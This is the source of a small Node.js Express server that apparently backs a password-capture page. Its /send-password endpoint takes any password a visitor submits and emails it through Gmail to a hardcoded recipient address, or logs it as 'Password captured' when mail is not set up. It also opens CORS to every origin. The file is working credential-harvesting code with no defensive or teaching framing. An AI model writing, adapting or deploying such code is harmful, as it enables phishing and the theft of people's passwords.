require("dotenv").config();

const path = require("path");
const express = require("express");
const nodemailer = require("nodemailer");

const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");

  if (req.method === "OPTIONS") {
    return res.sendStatus(204);
  }

  next();
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/password", (req, res) => {
  res.sendFile(path.join(__dirname, "password.html"));
});

app.get("/password.html", (req, res) => {
  res.sendFile(path.join(__dirname, "password.html"));
});

const emailUser = process.env.EMAIL_USER || "yourgmail@gmail.com";
const emailPass = process.env.EMAIL_PASS || "your-app-password";
const toEmail = process.env.TO_EMAIL || "28zilbel@gnsmail.ca";

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: emailUser,
    pass: emailPass,
  },
});

app.post("/send-password", async (req, res) => {
  const { password } = req.body || {};

  if (!password) {
    return res.status(400).json({ success: false, message: "Password required." });
  }

  const needsConfig =
    emailUser.includes("yourgmail") ||
    emailPass.includes("your-app-password") ||
    toEmail.includes("yourtargetemail");

  if (needsConfig) {
    console.log("Password captured but email is not configured:", password);
    return res.json({
      success: true,
      message: "Email not configured; password was logged to the server console.",
    });
  }

  try {
    await transporter.sendMail({
      from: emailUser,
      to: toEmail,
      subject: "Password entered",
      text: `The password entered was: ${password}`,
    });

    return res.json({ success: true, message: "Password email sent." });
  } catch (error) {
    console.error("Failed to send email:", error);
    return res.status(500).json({ success: false, message: "Email sending failed." });
  }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
  console.log("Set EMAIL_USER, EMAIL_PASS, and TO_EMAIL to send real emails.");
});
